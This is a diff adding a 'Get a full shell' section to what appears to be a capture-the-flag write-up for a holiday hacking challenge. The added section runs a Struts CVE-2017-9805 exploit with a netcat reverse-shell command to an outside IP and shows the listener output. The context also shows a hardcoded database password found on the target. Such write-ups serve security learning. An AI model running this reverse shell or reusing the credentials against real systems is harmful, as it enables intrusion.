@@ -459,6 +459,24 @@ www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2>/dev/null |
 /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
 #+END_SRC
 
+*** Get a full shell
+
+Getting a shell is actually fairly easy. Using the struts exploit we can redirect a bash shell through netcat back to our machine like this:
+
+#+BEGIN_SRC
+./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "nc -c /bin/bash 1.2.3.4 8080"
+#+END_SRC
+
+#+BEGIN_SRC
+holiday@hack:~$ nc -l -p 8080 -vvv
+Listening on [0.0.0.0] (family 0, port 8080)
+Connection from [35.227.53.70] port 8080 [tcp/http-alt] accepted (family 2, sport 48164)
+id
+uid=1003(alabaster_snowball) gid=1004(alabaster_snowball) groups=1004(alabaster_snowball)
+pwd
+/
+#+END_SRC
+
 * Common Pitfalls
    :PROPERTIES:
    :CUSTOM_ID: q2_common-pitfalls
